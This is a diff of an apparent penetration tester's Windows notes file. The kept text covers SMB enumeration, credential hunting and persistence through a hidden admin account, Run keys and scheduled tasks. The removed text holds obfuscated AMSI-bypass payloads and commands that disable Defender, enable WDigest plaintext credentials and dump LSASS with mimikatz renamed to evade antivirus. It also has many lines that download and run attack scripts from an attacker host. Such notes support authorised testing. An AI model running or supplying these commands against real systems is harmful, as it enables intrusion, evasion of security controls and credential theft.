@@ -1,345 +1,168 @@
 Windows
 
 
-# Anonymous users can obtain the Windows password policy
+# Overview
 
-msf > use auxiliary/scanner/smb/smb_enumusers 
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Entry point for Windows host reconnaissance, situational awareness, credential hunting, and persistence. Privilege escalation, credential dumping, and lateral movement are in companion files.
 
-# CIFS NULL Session Permitted
 
-enum4linux -a <target IP>
+# Related Notes
 
-nbtscan <target IP>
+active-directory.txt     Domain recon, BloodHound, AD abuse
+ldap-owa.txt             LDAP and OWA enumeration
+passwords.txt            Wordlists and cracking
+windows-credentials.txt  LSASS and hash dumping
+windows-lateral.txt      WinRM, RDP, pass-the-hash, PsExec
+windows-privesc.txt      Privilege escalation and AV/AMSI evasion
 
-rpcclient -U "" <target IP>
-Enter  's password: <return>
-rpcclient $> 
-srvinfo
-enumdomusers
-queryuser <user>
-netshareenum
-netshareenumall
-querydominfo
-getdompwinfo
 
-net use \\target IP\ipc$ "" /u:""
-------------------------------------------------------------------------------------------------------------------------------------------------------
+# Contents
 
-# CIFS Share Writable By Everyone
+SMB Enumeration, Local Accounts, Situational Awareness, Data Mining, Persistence
 
-Places > Network > Browse Network
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# NetBIOS and SMB
+# SMB Enumeration
 
-smbmap -H <target IP>                             Check for access to open shares
+## Overview
 
-enum -G <target IP>
-enum -P <target IP>
+Enumerate NetBIOS, SMB shares, null sessions, and anonymous access from Linux.
 
-nbtenum -r <target IP>
-nbtenum -q <target IP>
+## Commands
 
-nbtscan -r <target range>
-nbtscan -f hosts.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Password policy (Metasploit):
+    msf > use auxiliary/scanner/smb/smb_enumusers
 
-# Services
+Null session and RPC:
+    enum4linux-ng -A <target IP>
+    enum4linux -a <target IP>
+    nbtscan <target IP>
 
-PS C:\> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl
-------------------------------------------------------------------------------------------------------------------------------------------------------
+    rpcclient -U "" <target IP>
+    Enter 's password: <return>
+    rpcclient $> srvinfo
+    rpcclient $> enumdomusers
+    rpcclient $> queryuser <user>
+    rpcclient $> netshareenum
+    rpcclient $> netshareenumall
+    rpcclient $> querydominfo
+    rpcclient $> getdompwinfo
 
-# SMB Open File Shares
+    net use \\<target IP>\ipc$ "" /u:""
 
-- Anonymous
-smbclient -L <target IP>                          List shares
-smbclient //<target IP>/<share>                   Connect to a share
-smb: \> dir                                       List directory contents
-smb: \> more file.txt                             Read a file
-smb: \> get file.txt                              Download a file
-smb: \> put file.txt                              Upload a file
+Share mapping:
+    smbmap -H <target IP>
+    crackmapexec smb <target IP> -u '' -p ''
+    crackmapexec smb <target IP> --shares -u <user> -p <password>
 
-- Using credentials
-smbclient //<target IP>/<share> -U <user>
-------------------------------------------------------------------------------------------------------------------------------------------------------
+    nbtscan -r <target range>
+    nbtscan -f hosts.txt
 
-# User Accounts
+Anonymous smbclient:
+    smbclient -L <target IP>
+    smbclient //<target IP>/<share>
+    smb: \> dir
+    smb: \> more file.txt
+    smb: \> get file.txt
+    smb: \> put file.txt
 
-- Local
-net users                                         Local users
-net user <current user>                           Info on a local user
-net accounts                                      Local password policy
-net localgroup                                    Local security groups
-net localgroup Administrators                     Users in the local Administrators security group
-net localgroup "Remote Desktop Users"             Users in the local Remote Desktop Users security group
+With credentials:
+    smbclient //<target IP>/<share> -U <user>
 
-net user <user> <password> /add                   Create a new local user
-net localgroup HR /add                            Create a new local security group
-net localgroup Administrators <user> /add         Add the new user to the local Administrators security group
+## Validation / False Positives
 
-net view                                          Domains, computers, or resources that are being shared by the specified computer
-net view /domain                                  Computers in other domain
+Null session or guest access that only lists share names is lower severity than readable or writable shares.
+Confirm write access with smbclient put or crackmapexec --shares before reporting writable shares.
 
-- Domain
-net accounts /domain                              Domain password policy
-net user /domain                                  Domain users
-net user <user> /domain                           Info on a domain user
-net group /domain
-net group "domain admins" /domain                 Domain admin
-net group "domain users" /domain                  Domain users
-net group "domain controllers" /domain            Domain controllers
-nltest /domain_trusts                             Domain trusts
 
-net localgroup Administrators /domain             Users in the domain Administrators Security Group
-net localgroup /domain                            Domain Security Groups
+# Local Accounts
 
-net user <user> <password> /add /domain           Add a user to the domain
-net group "Domain Admins" <user> /add /domain     Add a user to a specific Security Group on the domain
-------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------
+## Commands
 
-# Situational awareness using a low level account
+net users
+net user <user>
+net accounts
+net localgroup
+net localgroup Administrators
+net localgroup "Remote Desktop Users"
 
-tasklist /v
-netstat -anop tcp
-ipconfig /all
-net user <user> /domain
+net view
+net view /domain
+
+## Domain enumeration
+
+See active-directory.txt for domain users, groups, trusts, and BloodHound collection.
+
+
+# Situational Awareness
+
+## Overview
+
+Run from a low-privilege shell on the target host.
+
+## Commands
 
 hostname
 whoami
 whoami /groups
 whoami /priv
-systeminfo                                        Hostname, OS name and version, domain, and hot fixes
-echo %logonserver%                                Which logon server you authenticated to (Domain Controller)
-net users                                         Local users
-net localgroup administrators                     Local administrators
-net session                                       Local sessions
-net share                                         Local shares
+systeminfo
+echo %logonserver%
 
-ipconfig /displaydns
-route print                                       Route table
-arp -a                                            ARP table
+tasklist /v
+netstat -anop tcp
 netstat -ano | findstr "LISTEN"
 netstat -ano | findstr "ESTABLISH"
 
-doskey /history                                   Command history
+ipconfig /all
+ipconfig /displaydns
+route print
+arp -a
+
+net users
+net localgroup administrators
+net session
+net share
+
+doskey /history
 gpresult /z
 
-- Domain
-net group "Domain Computers" /domain
-net group "Domain Admins" /domain
-net group "Enterprise Admins" /domain
+Get-Service | ? {$_.Status -eq "Running"} | select -First 20 | fl
 
-nltest /dclist:<domain>                           Domain controllers
-nltest /domain_trusts /all_trusts                 Domain trusts
+## Domain context
 
-net localgroup administrators /domain
-net user /domain                                  Domain users
-net view /domain                                  Domain computers
-net group /domain                                 Domain security groups
-net group "group name" /domain                    Users in a domain security group
-------------------------------------------------------------------------------------------------------------------------------------------------------
+If joined to a domain, see active-directory.txt for:
+    net user /domain, net group "Domain Admins" /domain, nltest /dclist:<domain>
 
-# Data mining
+
+# Data Mining
+
+## Commands
 
 dir /s *password* == *cred* == *vnc*
 findstr /si password *.ini *.pdf *.txt *.docx *.xlsx
 reg query HKCU /f password /t REG_SZ /s
-type <file>                                       Read a file
-------------------------------------------------------------------------------------------------------------------------------------------------------
+type <file>
 
-# Evasion
+## Validation / False Positives
 
-- Show Defender exclusions
-reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
+A filename containing "password" is not proof of a stored secret — open the file and confirm content.
 
-- Show AV installed
-Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
-
-- Misc
-Set-MpPreference -DisableScriptScanning $True
-Set-MpPreference -DisableRealtimeMonitoring $True
-Set-MpPreference -ExclusionProcess "explorer.exe", "cmd.exe", "powershell.exe"
-Add-MpPreference -ExclusionPath "C:\Windows\Temp"
-REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v EnableLUA
-New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
-
-- Enabled WDigest authentication. This will store new login credentials in plaintext.
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-
-- Disable LSA protection
-reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
-
-- Bypass AMSI
-https://github.com/HernanRodriguez1/Bypass-AMSI
-Open PowerShell as Administrator.
-- Option 1
-[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
-
-- Option 2
-&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )
-
-- Option 3
-${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
-${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
-${1}.SetValue($null,$true)
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Persistence
 
-- Create a new local user
-net user <user> <password> /add
-net localgroup Administrators <user> /add
+## Commands
 
-- Registry autorun key
-reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <key name> /t REG_SZ /f /d <path to binary>
-red delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <key name>
+Local admin user:
+    net user <user> <password> /add
+    net localgroup Administrators <user> /add
 
-- Scheduled task
-schtasks /create /f /tn <task name> /SC DAILY /st 09:00 /tr <path to binary>
-schtasks /delete /f /tn <task name>
+Registry Run key:
+    reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <key name> /t REG_SZ /f /d <path to binary>
+    reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <key name>
 
-- Startup Directory
-%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
-------------------------------------------------------------------------------------------------------------------------------------------------------
+Scheduled task:
+    schtasks /create /f /tn <task name> /SC DAILY /st 09:00 /tr <path to binary>
+    schtasks /delete /f /tn <task name>
 
-# Privilege Escalation
-
-Tools will need to be transferred to the target.
-
-- C#
-/opt/SharpCollection/
-SharpUp.exe audit
-
-- Executable
-/opt/SharpCollection/
-Seatbelt.exe -group=user -outputfile="C:\Users\Public\sb-user.txt"
-Seatbelt.exe -group=system -outputfile="C:\Users\Public\sb-system.txt"
-Seatbelt.exe -group=remote -outputfile="C:\Users\Public\sb-remote.txt"
-Watson.exe
-winPEAS.exe cmd
-
-- PowerShell
-cd /opt/PowerSploit/Privesc/
-python3 -m http.server 80
-powershell -nop -exec bypass
-iex (iwr -UseBasicParsing http://172.16.219.133/PowerUp.ps1); Invoke-AllChecks
-
-cd /opt/PrivescCheck/
-python3 -m http.server 80
-powershell -nop -exec bypass
-iex (iwr -UseBasicParsing http://172.16.219.133/PrivescCheck.ps1); Invoke-PrivescCheck
-
-- Python
-/opt/Windows-Exploit-Suggester-NG
-./wes.py --update
-systeminfo > systeminfo.txt
-Transfer the file to Kali with scp.
-./wes.py systeminfo.txt
-
-- Allow RDP through the firewall and start the service
-netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
-net start TermService
-
-- Turn off firewall
-netsh advfirewall firewall set allprofiles state off
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Dump the LSASS (Local Security Authority Subsystem Service) process
-
-This contains NTLM hashes of Windows credentials of users who have logged into the computer.
-They can be brute forced offline for cleartext passwords or used in a pass-the-hash attack for lateral movement.
-In order to dump LSASS, SEDebugPrivilege must be enabled: whoami /priv
-Need to be running from an admin Command Prompt.
-
-- Check if Credential Guard is configured and running
-$DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
-if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
-if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
-
-- GUI access
-Open the Task Manager > Details > right click on lsass.exe > Create dump file
-Transfer the dump to Kali with scp.
-pypykatz lsa dump lsass.dmp
-
-- ProcDump
-curl https://live.sysinternals.com/tools/procdump.exe -o procdump.exe
-procdump.exe -accepteula -ma lsass.exe lsass.dmp
-
-Some EDR solutions will alert or block this based on the “lsass” process name.
-This can usually be bypassed by specifying the LSASS process ID instead.
-tasklist | findstr lsass
-procdump.exe -accepteula -ma <PID> lsass.dmp
-
-- PowerSploit
-cp /opt/PowerSploit/Exfiltration/Out-Minidump.ps1 .
-Edit the file by removing the usage (lines 3-68).
-python3 -m http.server
-Open PowerShell as Administrator.
-iex (iwr -UseBasicParsing http://172.16.219.133/mod-Out-Minidump.ps1); Get-Process lsass | Out-Minidump
-
-- CME
-crackmapexec smb <target IP> -u <admin user> -p <password> --lsa
-Output stored in ~/.cme/logs/
-
--SharpDump
-/opt/SharpCollection/NetFramework_4.7_x64/SharpDump.exe
-Transfer the file to the target.
-SharpDump.exe
-Transfer the dump to a Windows VM.
-Rename debug<PID>.bin to debug<PID>.gz
-mimikatz.exe
-sekurlsa::minidump C:\Users\joe\debug<PID>
-sekurlsa::logonPasswords
-
-- mimikatz.exe
-Rename mimikatz.exe to DumbStack.log to bypass Windows Defender.
-cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe DumbStack.log
-python3 -m http.server
-curl http://172.16.219.133/DumbStack.log -o DumbStack.log
-DumbStack.log
-sekurlsa::minidump lsass.dmp
-log lsass.txt
-sekurlsa::logonPasswords
-
-- PowerShell version of mimikatz
-cd /opt/Nishang/Gather/
-python3 -m http.server 80
-Open PowerShell as Administrator.
-Run AMSI bypass from above.
-iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-Mimikatz.ps1); Invoke-Mimikatz -Command privilege::debug
-iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-Mimikatz.ps1); Invoke-Mimikatz -Command sekurlsa::logonpasswords
-
-- PowerSharpPack
-cd /opt/PowerSharpPack/PowerSharpBinaries/
-python3 -m http.server 80
-Open PowerShell as Administrator.
-Run AMSI bypass from above.
-iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-SharpKatz.ps1); Invoke-SharpKatz
-
-iex (iwr -UseBasicParsing http://172.16.219.133/Invoke-BetterSafetyKatz.ps1); Invoke-BetteerSafetyKatz
-privilege::debug
-sekurlsa::logonpasswords
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Lateral Movement
-
-- Windows Remote Management (WinRM)
-nmap -Pn -n -T4 --open -p5985,5986 -sV <target IP>
-
-msf > use auxiliary/scanner/winrm/winrm_auth_methods     Identify the WinRM authentication method
-
-crackmapexec winrm <target IP> -u <user> -p <password> -x ipconfig
-
-evil-winrm -i <target IP> -u <user> -p <password> -s /opt/Nishang/
-menu
-Gather/Invoke-Mimikatz.ps1
-Invoke-Mimikatz
-evil-winrm -i <target IP> -u <user> -H <hash>
-
-- Find open file shares
-cd /opt/PowerSploit/Recon/
-python3 -m http.server 80
-powershell -nop -exec bypass
-iex (iwr -UseBasicParsing http://172.16.219.133/PowerView.ps1); Invoke-ShareFinder -CheckShareAccess
+Startup directory:
+    %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
